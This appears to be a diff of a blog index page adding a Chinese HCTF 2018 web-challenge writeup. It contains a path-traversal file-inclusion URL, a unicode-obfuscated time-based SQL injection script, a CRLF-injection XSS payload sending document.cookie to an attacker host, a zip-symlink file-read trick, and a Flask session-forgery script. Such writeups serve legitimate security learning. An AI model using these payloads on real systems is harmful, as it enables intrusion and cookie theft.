@@ -247,6 +247,164 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/11/hctf2018 Web部分Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/11/11/hctf2018 Web部分Writeup/" itemprop="url">
+                  hctf2018 Web部分Writeup
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-11T20:29:17+08:00">
+                2018-11-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/11/11/hctf2018 Web部分Writeup/" class="leancloud_visitors" data-flag-title="hctf2018 Web部分Writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>又是一年双十一，又是一年hctf，web狗写一下自己学到的，做出来的题目</p>
+<h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><p>查看源代码在注释里发现source.php，访问得到index.php的代码。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></div><div class="line">        &#123;</div><div class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</div><div class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</div><div class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            $_page = mb_substr(</div><div class="line">                $page,</div><div class="line">                <span class="number">0</span>,</div><div class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</div><div class="line">            );</div><div class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</div><div class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            $_page = urldecode($page);</div><div class="line">            $_page = mb_substr(</div><div class="line">                $_page,</div><div class="line">                <span class="number">0</span>,</div><div class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</div><div class="line">            );</div><div class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</div><div class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</div><div class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</div><div class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</div><div class="line">    ) &#123;</div><div class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</div><div class="line">    &#125;  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><a href="http://seaii-blog.com/index.php/2018/07/03/84.html" target="_blank" rel="external">CVE-2018-12613 phpMyAdmin后台文件包含分析</a></p>
+<p>paylaod:<code>http://warmup.2018.hctf.io/index.php?file=hint.php%253f/../../../../../../ffffllllaaaagggg</code></p>
+<p>flag:<code>hctf{e8a73a09cfdd1c9a11cca29b2bf9796f}</code></p>
+<h3 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h3><p>www.zip下载到源码，分析源码</p>
+<p>在include/safe.php里找到了waf</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$blacklist = <span class="string">'/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i'</span>;</div></pre></td></tr></table></figure>
+<p>在memeber.php里发现了json_decode()函数，json_decode()在解json格式的同时还会将unicode转码。利用unicode绕过waf，对<code>login_data</code>注入。</p>
+<p>payload:<code>cookie:islogin=1;login_data={&quot;admin_user&quot;:&quot;\u0061\u0064\u006d\u0069\u006e\u0027\u0020\u0061\u006e\u0064\u0020\u0069\u0066\u0028\u0028\u0073\u0075\u0062\u0073\u0074\u0072\u0028\u0028\u0064\u0061\u0074\u0061\u0062\u0061\u0073\u0065\u0028\u0029\u0029\u002c\u0031\u002c\u0031\u0029\u003d\u0027\u0068\u0027\u0029\u002c\u0073\u006c\u0065\u0065\u0070\u0028\u0035\u0029\u002c\u0031\u0029\u0023&quot;,&quot;admin_password&quot;:&quot;123&quot;}</code></p>
+<p>直接上timesql的脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests,time,string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicode</span><span class="params">(s)</span>:</span></div><div class="line">    unis = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</div><div class="line">        unis += <span class="string">'\u00'</span>+i.encode(<span class="string">"hex"</span>)</div><div class="line">    <span class="keyword">return</span> unis</div><div class="line"></div><div class="line">url = <span class="string">"http://kzone.2018.hctf.io/admin/index.php"</span></div><div class="line">dic = <span class="string">"hctf&#123;&#125;1234567890qweryuiopasdgjklzxvbnm"</span></div><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> dic:</div><div class="line">        <span class="comment">#payload = "admin' and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s'),sleep(5),1)#" % (i,s)</span></div><div class="line">        <span class="comment">#payload = "admin' and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='F1444g'),%d,1)='%s'),sleep(5),1)#" % (i,s)</span></div><div class="line">        payload = <span class="string">"admin' and if((substr((select binary F1a9 from F1444g),%d,1)='%s'),sleep(5),1)#"</span> % (i,c)</div><div class="line">        payload = unicode(payload)</div><div class="line">        cookies = &#123;</div><div class="line">            <span class="string">"islogin"</span>:<span class="string">"1"</span>,</div><div class="line">            <span class="string">"login_data"</span>:<span class="string">'&#123;"admin_user":"'</span>+payload+<span class="string">'","admin_pass":"123"&#125;'</span></div><div class="line">        &#125;</div><div class="line">        time_start = time.time()</div><div class="line">        c = requests.get(url=url,cookies=cookies).content</div><div class="line">        time_end = time.time()</div><div class="line">        <span class="keyword">if</span> time_end - time_start &gt;= <span class="number">5</span>:</div><div class="line">            flag += c</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
+<p>flag:<code>hctf{4526a8cbd741b3f790f95ad32c2514b9}</code></p>
+<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p>github下载源码</p>
+<p>还是unicode的用法</p>
+<p><a href="https://paper.tuisec.win/detail/a9ad1440249d95b" target="_blank" rel="external">unicode安全</a></p>
+<p>注册<code>ᴬdmin</code>strlower()可以将<code>ᴬ</code>变为<code>A</code>，再登陆修改密码<code>A</code>变为<code>a</code></p>
+<p>flag:<code>hctf{un1c0dE_cHe4t_1s_FuNnying}</code></p>
+<h3 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h3><p>Bottle HTTP 头注入漏洞，找到了离别歌师傅的博客</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="external">Bottle HTTP 头注入漏洞探究</a></p>
+<p>payload:<code>http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0AX-XSS-Protection:0%0A%0A%3Cscript%3Elocation.href=</code><a href="http://ip/xss/index.php?a=`%2bdocument.cookie%3C/script%3E`" target="_blank" rel="external">http://ip/xss/index.php?a=`%2bdocument.cookie%3C/script%3E`</a></p>
+<h3 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h3><p>上传zip，利用软连接读取文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ln -s xxx xxx</div><div class="line">zip -y xxx.zip xxx</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">user nginx; worker_processes auto; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; events &#123; worker_connections 1024; &#125; http &#123; include /etc/nginx/mime.types; default_type application/octet-stream; log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; include /etc/nginx/conf.d/*.conf; &#125; daemon off; </div><div class="line"></div><div class="line">server &#123; listen 80; location / &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; location /static &#123; alias /app/static; &#125; &#125; </div><div class="line"></div><div class="line">[uwsgi]</div><div class="line">socket = /tmp/uwsgi.sock</div><div class="line">chown-socket = nginx:nginx</div><div class="line">chmod-socket = 664</div><div class="line"># Graceful shutdown on SIGTERM, see https://github.com/unbit/uwsgi/issues/849#issuecomment-118869386</div><div class="line">hook-master-start = unix_signal:15 gracefully_kill_them_all</div><div class="line"></div><div class="line">[uwsgi]</div><div class="line">module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main</div><div class="line">callable=app</div><div class="line">logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log</div><div class="line">/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</div><div class="line">#! /usr/bin/env bash set -e # If there&apos;s a prestart.sh script in the /app directory, run it before starting P</div><div class="line">RE_START_PATH=/app/prestart.sh echo &quot;Checking for script in $PRE_START_PATH&quot; if [ -f $PRE_START_PATH ] ; then echo &quot;Running script $PRE_START_PATH&quot; source $PRE_START_PATH else echo &quot;There is no script $PRE_START_PATH&quot; fi # Start Supervisor, with Nginx and uWSGI exec /usr/bin/supervisord </div><div class="line">/app/hard_t0_guess_n9f5a95b5ku9fg/__pycache__/hard_t0_guess_also_df45v48ytj9_main.cpython-36.pyc</div><div class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi</div><div class="line">SUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=7d8beb1a9aa4SHLVL=0</div><div class="line">PYTHON_PIP_VERSION=18.1</div><div class="line">HOME=/root</div><div class="line">GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DU</div><div class="line">WSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</div><div class="line">NGINX_MAX_UPLOAD=0</div><div class="line">UWSGI_PROCESSES=16</div><div class="line">STATIC_URL=/static</div><div class="line">UWSGI_CHEAPER=2</div><div class="line">NGINX_VERSION=1.13.12-1~stretch</div><div class="line">PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</div><div class="line">NJS_VERSION=1.13.12.0.2.0-1~stretch</div><div class="line">LANG=C.UTF-8</div><div class="line">SUPERVISOR_ENABLED=1</div><div class="line">PYTHON_VERSION=3.6.6</div><div class="line">NGINX_WORKER_PROCESSES=auto</div><div class="line">SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock</div><div class="line">SUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0</div><div class="line">PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_</div><div class="line">PATH=/app/static</div><div class="line">PYTHONPATH=/app</div><div class="line">UWSGI_RELOADS=0</div></pre></td></tr></table></figure>
+<p>然后读取源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</div><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> flag</div><div class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</div><div class="line"><span class="keyword">import</span> os</div><div class="line">random.seed(uuid.getnode())</div><div class="line">app = Flask(__name__)</div><div class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</div><div class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></div><div class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></div><div class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</div><div class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/', methods=['GET'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</div><div class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</div><div class="line">        session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</div><div class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</div><div class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></div><div class="line">    username=request.form[<span class="string">'username'</span>]</div><div class="line">    password=request.form[<span class="string">'password'</span>]</div><div class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</div><div class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</div><div class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</div><div class="line">        session[<span class="string">'username'</span>] = username</div><div class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></div><div class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</div><div class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</div><div class="line"></div><div class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</div><div class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</div><div class="line">    file = request.files[<span class="string">'the_file'</span>]</div><div class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</div><div class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</div><div class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</div><div class="line">        filename = secure_filename(file.filename)</div><div class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</div><div class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</div><div class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></div><div class="line">        file.save(file_save_path)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        extract_path = file_save_path + <span class="string">'_'</span></div><div class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</div><div class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</div><div class="line">        file = read_obj.read()</div><div class="line">        read_obj.close()</div><div class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        file = <span class="keyword">None</span></div><div class="line"></div><div class="line">    os.remove(file_save_path)</div><div class="line">    <span class="keyword">if</span>(file != <span class="keyword">None</span>):</div><div class="line">        <span class="keyword">if</span>(file.find(base64.b64dcode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</div><div class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</div><div class="line">    <span class="keyword">return</span> Response(file)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="comment">#app.run(debug=True)</span></div><div class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="keyword">True</span>, port=<span class="number">10008</span>)</div></pre></td></tr></table></figure></p>
+<p>SECRET_KEY中的随机数种子是<code>uuid.getnode()</code>的值，可以通过读取<code>/sys/class/net/eth0/address</code>mac地址获得</p>
+<p>伪造admin的cookie<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> session,Flask</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line">random.seed(<span class="number">20015589129314</span>)</div><div class="line">app = Flask(__name__)</div><div class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/', methods=['GET'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    session[<span class="string">'username'</span>]=<span class="string">'admin'</span></div><div class="line">    <span class="keyword">return</span> <span class="string">"123"</span></div><div class="line">app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="keyword">True</span>, port=<span class="number">10008</span>)</div></pre></td></tr></table></figure></p>
+<p>flag:<code>hctf{2495e2ef667b367a0738f5eae9d6afb983c2}</code></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/05/2018科来杯山东省省赛Web Writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1481,145 +1639,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/PicoCTF-level3-WriteUp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Windylh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Windylh's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/09/18/PicoCTF-level3-WriteUp/" itemprop="url">
-                  PicoCTF Level3 WriteUp
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-18T00:00:00+08:00">
-                2017-09-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/09/18/PicoCTF-level3-WriteUp/" class="leancloud_visitors" data-flag-title="PicoCTF Level3 WriteUp">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Biscuit"><a href="#Biscuit" class="headerlink" title="Biscuit"></a>Biscuit</h3><p>打开题目，显示<code>Access Denied</code>，还有姜饼人的背景。</p>
-<p>查看源代码，其中有注释。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!-- Storing stuff in the same directory as your web server doesn&apos;t seem like a good idea --&gt;</div><div class="line">&lt;!-- Thankfully, we use a hidden one that is super PRIVATE, to protect our cookies.sqlite file --&gt;</div></pre></td></tr></table></figure></p>
-<p>提示我们去访问/private/cookies.sqlite文件。</p>
-<p>下载到了cookies.sqlite，sqlite是一种轻型的数据库，要用sqlite3去打开他。<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/09/18/PicoCTF-level3-WriteUp/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1669,7 +1688,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">26</span>
+                <span class="site-state-item-count">27</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
